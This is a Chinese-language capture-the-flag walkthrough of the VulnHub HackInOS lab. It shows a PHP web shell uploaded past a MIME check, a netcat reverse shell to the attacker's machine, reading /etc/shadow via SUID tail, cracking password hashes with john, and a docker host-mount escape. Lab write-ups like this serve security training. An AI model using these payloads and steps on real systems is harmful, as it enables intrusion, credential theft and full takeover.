# 下载地址

Download: https://drive.google.com/file/d/1PBZHmRjvJGPmsCFsp_esqfMGitXAgyS4/view

Download (Mirror): https://download.vulnhub.com/hackinos/HackInOS.ova

Download (Torrent): https://download.vulnhub.com/hackinos/HackInOS.ova.torrent     ( Magnet)

# 主机发现

首先使用命令发现主机

```shell
netdiscover -r 192.168.217.0/24
```

![1553570545227](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553570545227.png)

找到192.168.217.136，应该就是本次待入侵的靶机了。

使用nmap进行端口发现

```shell
nmap -A -T5 -v 192.168.217.136
```

发现存活端口：22/8000

![1553570668740](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553570668740.png)

其中8000为web端口，接下来我们可以web开始发掘

# web渗透

首先通过浏览器打开web页面查看一下。

![1553570793476](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553570793476.png)

查看源代码

![1553570831274](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553570831274.png)

发现源代码中是使用localhost来进行dns解析的，所以我们刚刚打开web页面的时候，没办法获取正常的样式，修改一下hosts文件

```shell
localhost 192.168.217.136
```

再次访问

![1553578242424](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553578242424.png)

web页面可以正常打开。

通过查看页面，可以发现这是一个wordpress的站点。

尝试找一波wordpress的漏洞。

未发现任何可以直接rce的漏洞

![1553581183387](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553581183387.png)

那么，下一步尝试爆破一下目录

```shell
dirb http://localhost:8000
```

得出如下目录信息

```shell
http://localhost:8000/robots.txt
http://localhost:8000/uploads/
```

尝试访问robots文件

![1553581743375](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553581743375.png)

发现了upload.php和uploads/目录。

尝试访问/uploads/，提示403

![1553581782343](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553581782343.png)

尝试访问upload.php

![1553581838979](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553581838979.png)

发现一个上传页面，果断尝试上传利用

## 上传利用

首先查看源代码，发现了如下信息

![1553581951301](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553581951301.png)

访问上述地址https://github.com/fatihhcelik/Vulnerable-Machine---Hint

看到了upload.php，猜测这是上传页面的源代码，下载查看

首先发现它有一个重命名的机制

![1553582155691](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553582155691.png)

随机选取1-100的数字和文件名结合然后计算md5值进行重新命名。

其次发现了它对文件格式的检测是对mime检测，仅支持图片格式

![1553582240552](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553582240552.png)

那么接下来，我们就可以构造一个小马文件，实现上传绕过。

编写文件，cmd.php

```php
GIF89a
<? system($_GET['cmd']); ?>
```

将上述文件上传

![1553582566734](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553582566734.png)

![1553582592279](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553582592279.png)

可以看到，上传成功，接下来，就是需要将上传以后的文件名称爆破出来，首先生成一个文件名称字典

编写文件sheng.php

```php
<?php
for ($i = 1; $i <= 100; $i++){
	echo md5("cmd.php".$i);
	echo "\r\n";
}
```

生成文件名称字典

```php
php sheng.php > sheng.txt
```

![1553582963831](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553582963831.png)

接下来，尝试遍历出真正的文件名

```shell
wfuzz -w sheng.txt --hc 404 http://localhost:8000/uploads/FUZZ.php
```

![1553583089903](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553583089903.png)

至此为止，已经成功得到了上传的名称，尝试使用浏览器直接访问

```php
http://localhost:8000/uploads/4051b0b087ce50bbe0a810d106d329ab.php
```

![1553583210765](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553583210765.png)

尝试执行命令

```php
http://localhost:8000/uploads/4051b0b087ce50bbe0a810d106d329ab.php?cmd=id
```

![1553583255131](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553583255131.png)

使用nc反弹shell

本地输入

```shell
nc -nlvvp 1337
```

浏览器中输入

```shell
http://192.168.217.136:8000/uploads/984a75b41e315a843c9c892d0cd234ef.php?cmd=nc 192.168.217.130 1337 -e /bin/bash
```

![1553587078421](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553587078421.png)

设置bash的临时环境变量

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

获取到临时环境变量以后，这个时候输入的命令都会再次出现，输入

```shell
stty raw -echo
```

![1553588561087](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553588561087.png)

然后，为了执行起来更方便，诸如一些输出和clear之类的，将TERM设置到当前屏幕

```shell
export TERM=screen
```

## 提权

这里可以利用suid进行提权查看root文件

```shell
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![1553588975466](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553588975466.png)

可以发现，其中有tail，我们可以拿tail来查看root用户的文件

```shell
tail -c1G /etc/shadow
```

![1553589032461](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553589032461.png)

将其中的root部分复制出来

```shell
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
```

将密码字段保存为文本文件，并进行爆破

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

爆破成功以后，可以直接查看明文

![1553589295617](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553589295617.png)

可以看到，密码是john

到这里，我们成功拿到了root的密码

尝试登陆root用户

![1553589348103](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553589348103.png)

查看flag文件，发现这并不是真正的flag文件

![1553589386321](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553589386321.png)

其中有一个隐藏文件，查看它的内容

```shell
root@1afdd1f6b82c:~# more .port
Listen to your friends..
7*
```

不晓得啥意思，

# 内网渗透

去web目录下，查看配置文件寻找线索

```
cd /var/www/html
more wp-config.php
```

![1553589619378](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553589619378.png)

可以看到，wordpress这个站点使用的数据库的信息。尝试查看db这台主机

```shell
ping db
```

确认，db的主机ip为172.18.0.2

尝试直接连接其mysql数据库

```shell
mysql -h 172.18.0.2 -uwordpress -pwordpress
```

在wordpress数据库中发现了一个host_ssh_cred表

![1553589910102](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553589910102.png)

尝试查看其表的内容，发现了用户名和密码

```shell
hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e
```

尝试爆破密码

```shell
john -format=RAW-md5 ssh
```

![1553590036929](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553590036929.png)

成功找到，密码是123456

尝试连接该主机

```shell
ssh hummingbirdscyber@172.18.0.2
```

但是发现没有ssh这个命令，那么猜测这个用户名和密码可能是靶机的。直接从本地连接

```shell
ssh hummingbirdscyber@192.168.217.136
```

成功连接进入

## 内网主机提权



查看用户情况

```shell
 id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
```

通过输出，看出来这个用户是docker组的。

查看docker的镜像

```shell
docker images
```

![1553590351163](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553590351163.png)

其中存在ubuntu镜像，那么，我们可以新建一个容器，将当前系统的根目录挂载到docker中，并进行查看

```shell
docker run -v /:/test -i -t ubuntu /bin/bash
```

![1553590841749](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553590841749.png)

可以看到，进入docker以后，存在一个test目录

让我们进去看看

![1553590869007](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553590869007.png)

成功的读取到了宿主机的根目录下的所有文件。

前往 root目录下，查看flag

```
cd /test/root/
more flag
```

![1553590952694](F:\学习资料\github\vulnhub-writeup\hackinos-1\assets\1553590952694.png)

成功！！！

到此为止，成功攻破该系统，拿下flag，哈哈哈



